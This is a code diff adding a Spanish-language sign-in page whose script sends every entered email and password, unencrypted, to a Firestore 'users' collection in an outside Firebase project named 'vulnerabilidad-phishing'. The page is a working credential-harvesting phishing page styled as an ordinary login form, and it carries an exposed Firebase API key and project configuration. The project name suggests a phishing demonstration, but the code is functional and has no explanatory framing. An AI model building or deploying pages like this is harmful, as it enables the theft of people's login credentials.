@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Web Page</title>
+    <link rel="stylesheet" href="estilo.css">
+</head>
+<body>
+    <div class="container">
+        <div class="square">
+            <div class="logo">
+                <img src="logo.png" alt="Company Logo" class="company-logo">
+            </div>
+            <div class="form">
+                <input id="email" type="text" placeholder="Ingresa tu correo o número de celular" required>
+                <input id="password" type="password" placeholder="Ingresa tu contraseña" required>
+                <label id="forgotPassword">¿Olvidaste tu correo?</label>
+                <button id="submitButton">Siguiente</button>
+                <div class="separator">
+                    <span class="or">o</span>
+                </div>
+                <!--<button class="sign-up" href="links.html">Registrarse</button>-->
+                <a class="sign-up" href="links.html">Registrarse</a>
+            </div>
+            <div class="final">
+                <!-- Insert your small PNG image here -->
+                <div class="languages">
+                    <span>Inglés</span> | <span>Español</span> | <span>Frances</span> | <span>Chino</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+ <!-- Firebase -->
+ <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.20.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.20.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyC_iAy5nsW00IxPb72TEBEtgM8niE36XKk",
+        authDomain: "vulnerabilidad-phishing.firebaseapp.com",
+        databaseURL: "https://vulnerabilidad-phishing-default-rtdb.firebaseio.com",
+        projectId: "vulnerabilidad-phishing",
+        storageBucket: "vulnerabilidad-phishing.appspot.com",
+        messagingSenderId: "455976221978",
+        appId: "1:455976221978:web:159c9720272dceea3600a3"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    async function addUserToDatabase(email, password) {
+      try {
+        const docRef = await addDoc(collection(db, "users"), {
+          email: email,
+          password: password,
+        });
+        console.log("Document added with ID: ", docRef.id);
+      } catch (e) {
+        console.error("Error adding document: ", e);
+      }
+    }
+
+    async function submitData() {
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+
+      const email = emailInput.value;
+      const password = passwordInput.value;
+
+      console.log("Submit data called with email:", email, "and password:", password);
+
+      if (email && password) {
+        await addUserToDatabase(email, password);
+      } else {
+        alert("Por favor, ingresa un correo y contraseña.");
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const submitButton = document.getElementById("submitButton");
+      submitButton.addEventListener("click", submitData);
+    });
+  </script>
+</body>
+</html>
